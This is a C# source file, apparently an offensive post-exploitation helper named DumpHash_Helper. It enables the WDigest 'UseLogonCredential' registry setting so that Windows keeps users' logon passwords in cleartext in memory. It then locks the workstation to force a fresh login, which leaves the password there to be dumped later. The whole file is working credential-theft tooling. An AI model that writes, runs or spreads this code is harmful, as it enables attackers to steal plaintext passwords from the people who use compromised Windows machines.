using System;
using Microsoft.Win32;
using System.Runtime.InteropServices;

namespace DumpHash_Helper
{
    class Program
    {
        [DllImport("user32.dll")]
        public static extern bool LockWorkStation();

        static void Main(string[] args)
        {
            Program program = new Program();
            RegistryKey wdigest;
            object key;
            key = program.checkReg(out wdigest);
            if (program.setReg(key, wdigest) == true)
            {
                if ((int)program.checkReg(out wdigest) == 1)
                {
                    Console.WriteLine("[*] Bingo!");
                    LockWorkStation();
                }
                else
                {
                    Console.WriteLine("[!] Can't update the Reg......");
                }
            }
            else
            {
                Console.WriteLine("[!] Something Wrong......");
            }
        }

        private object checkReg(out RegistryKey wdigest)
        {
            object key;
            
            RegistryKey hkml = Registry.LocalMachine;
            RegistryKey system = hkml.OpenSubKey("System", true);
            RegistryKey currentControlSet = system.OpenSubKey("CurrentControlSet", true);
            RegistryKey control = currentControlSet.OpenSubKey("Control", true);
            RegistryKey securityProviders = control.OpenSubKey("SecurityProviders", true);
            wdigest = securityProviders.OpenSubKey("WDigest", true);
            key = wdigest.GetValue("UseLogonCredential");
            return key;
        }

        private bool setReg(object key, RegistryKey wdigest)
        {
            try

            {
                if (key == null | (int) key == 0)
                {
                    wdigest.SetValue("UseLogonCredential", 1, RegistryValueKind.DWord);
                    wdigest.Close();
                    return true;
                }
                else
                {
                    return true;
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("[!] ERROR: "+ e.Message);
                return false;
            }
        }
        }
    
    }
